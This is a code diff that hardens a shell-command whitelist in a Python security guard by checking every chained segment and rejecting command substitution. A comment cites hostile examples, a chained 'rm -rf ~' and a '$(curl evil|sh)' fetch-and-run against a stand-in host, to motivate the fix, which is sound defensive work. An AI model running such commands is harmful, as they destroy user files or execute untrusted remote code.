@@ -4,9 +4,54 @@ import fnmatch
 import re
 from dataclasses import dataclass
 from pathlib import Path
-from typing import List
+from typing import List, Optional
 
 from neow.utils.logger import logger
+
+
+SUBSTITUTION_PATTERN = re.compile(r"\$\(|`")
+
+
+def split_chained_commands(command: str) -> List[str]:
+    """Split a shell command into simple commands at top-level ``;``, ``&&``,
+    ``||``, ``|``, ``&`` and newlines, respecting quoted strings.
+
+    This is a whitelist-checking aid, not a shell parser: it does not resolve
+    variables, globs or subshells. Callers should refuse command substitution
+    separately (see ``SUBSTITUTION_PATTERN``), since its contents cannot be
+    inspected this way.
+    """
+    segments: List[str] = []
+    current: List[str] = []
+    quote: Optional[str] = None
+    i, n = 0, len(command)
+    while i < n:
+        ch = command[i]
+        if quote:
+            current.append(ch)
+            if ch == quote and command[i - 1] != "\\":
+                quote = None
+            i += 1
+            continue
+        if ch in ("'", '"'):
+            quote = ch
+            current.append(ch)
+            i += 1
+            continue
+        if command[i : i + 2] in ("&&", "||"):
+            segments.append("".join(current))
+            current = []
+            i += 2
+            continue
+        if ch in (";", "|", "&", "\n"):
+            segments.append("".join(current))
+            current = []
+            i += 1
+            continue
+        current.append(ch)
+        i += 1
+    segments.append("".join(current))
+    return [s.strip() for s in segments if s.strip()]
 
 
 @dataclass
@@ -51,19 +96,35 @@ class SecurityGuard:
         Returns:
             SecurityCheck with allowed status and reason.
         """
-        base_cmd = command.strip().split()[0] if command.strip() else ""
-
         if self.is_dangerous(command):
             return SecurityCheck(
                 allowed=False,
                 reason=f"Dangerous command detected: {command}",
             )
 
-        if allowed_commands and base_cmd not in allowed_commands:
+        if not allowed_commands:
+            return SecurityCheck(allowed=True, reason="")
+
+        # The shell runs the whole string (``shell=True``); checking only the
+        # first word lets ``allowed_cmd; rm -rf ~`` or ``$(curl evil|sh)``
+        # through. Check every chained segment and refuse substitution, which
+        # cannot be inspected this way.
+        if SUBSTITUTION_PATTERN.search(command):
             return SecurityCheck(
                 allowed=False,
-                reason=f"Command '{base_cmd}' not in whitelist: {allowed_commands}",
+                reason=(
+                    "Command substitution ($(...) or `...`) is not allowed "
+                    "while an allowed_commands whitelist is configured"
+                ),
             )
+
+        for segment in split_chained_commands(command):
+            base_cmd = segment.split()[0] if segment.split() else ""
+            if base_cmd and base_cmd not in allowed_commands:
+                return SecurityCheck(
+                    allowed=False,
+                    reason=f"Command '{base_cmd}' not in whitelist: {allowed_commands}",
+                )
 
         return SecurityCheck(allowed=True, reason="")
 
